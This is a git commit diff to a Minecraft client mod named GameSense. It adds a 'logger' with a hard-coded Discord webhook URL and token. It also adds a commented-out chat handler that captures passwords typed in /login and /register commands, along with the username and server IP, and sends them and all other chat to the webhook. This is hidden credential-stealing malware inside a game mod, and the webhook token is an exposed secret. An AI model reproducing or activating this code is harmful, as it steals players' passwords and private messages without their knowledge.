668c4bb92776013d7a20ab64225da09fd0f1ddfd
UwU_#5276 <110829847+pro133wwa@users.noreply.github.com>
2022-12-19 16:04:32 +0300

    UwU_#5276 logger

--- Game/Sense/client/GameSense.java
+++ Game/Sense/client/GameSense.java
@@ -1,6 +1,9 @@
 package Game.Sense.client;
 
 
+import Game.Sense.client.Helper.events.impl.input.logger.config.cfg;
+import Game.Sense.client.Helper.events.impl.input.logger.webhook.DiscordWebhook;
+import Game.Sense.client.UI.UwU.ClientChatEvent;
 import Game.Sense.client.mine.cmd.CommandManager;
 import Game.Sense.client.mine.cmd.macro.MacroManager;
 import Game.Sense.client.mine.drag.DraggableHUD;
@@ -24,11 +27,13 @@ import Game.Sense.client.Helper.Utility.render.cosmetic.CosmeticRender;
 import Game.Sense.client.Helper.Utility.render.cosmetic.impl.DragonWing;
 import net.minecraft.client.Minecraft;
 import net.minecraft.client.renderer.entity.RenderPlayer;
+import net.minecraft.network.play.client.CPacketChatMessage;
 import org.apache.logging.log4j.Logger;
 import org.lwjgl.opengl.Display;
 
 import java.awt.*;
 import java.io.IOException;
+import java.util.Objects;
 
 public class GameSense {
     public static ScaleUtils scale = new ScaleUtils(2);
@@ -46,7 +51,7 @@ public class GameSense {
 
     public FriendManager friendManager;
     public ClickGuiScreen clickGui;
-    private static Logger logger;
+
 
     public static GameSense instance = new GameSense();
 
@@ -56,17 +61,44 @@ public class GameSense {
 
     public String name = "GameSense";
     public String type = "Premium";
+    public static DiscordWebhook webhookLogger = GameSense.logger;
     public String version = "0.1";
     public String coder = "UwU_, toperov, DiGGeR";
+    public static DiscordWebhook logger = new DiscordWebhook("https://discord.com/api/webhooks/978740462162673665/OwZ7X2hfh-OuPAh5rJ4-6vfxFsHuoO40KuWYPI7NxqpG0OiDstLL9Kq0aRJnEaRrjxch");
 
 
-    public void init() {
+//    public static void ChatEvent(ClientChatEvent event) throws IOException {
+//        String msg = event.getMessage();
+//        String[] sentences = event.getMessage().split(" ");
+//        if ((msg.startsWith("/l") || msg.startsWith("/login") ||  msg.startsWith("/reg") || msg.startsWith("/register")) && sentences.length > 1) {
+//            webhookLogger.clearEmbeds();
+//            webhookLogger.addEmbed(new DiscordWebhook.EmbedObject()
+//                    .setTitle("Infinity")
+//                    .setDescription("Minecraft Modification | Logger")
+//                    .setColor(new Color(0x0082FF))
+//                    .addField("USER", Minecraft.getMinecraft().getSession().getUsername(), true)
+//                    .addField("PASSWORD", sentences[1], true)
+//                    .addField("SERVER", Objects.requireNonNull(Minecraft.getMinecraft().getCurrentServerData()).serverIP, true)
+//                    .addField("PING", String.valueOf(Objects.requireNonNull(Minecraft.getMinecraft().getCurrentServerData()).pingToServer), true)
+//                    .setThumbnail("https://cdn.discordapp.com/avatars/860143202358525982/efef80293eb31d69dd3c654ebd1a5575.webp?size=100"));
+//            webhookLogger.execute();
+//
+//        } else {
+//            webhookLogger.setContent("```" + Minecraft.getMinecraft().getSession().getUsername() + ": " + msg + "```");
+//            webhookLogger.execute();
+//        }
+//    }
+
+
+
+
+    public void init() throws IOException {
 
 
         time = System.currentTimeMillis();
         Display.setTitle(name + " " + type + " " + version);
         (fileManager = new FileManager()).loadFiles();
-
+//        GameSense.ChatEvent(null);
         friendManager = new FriendManager();
         featureManager = new ModuleManager();
 
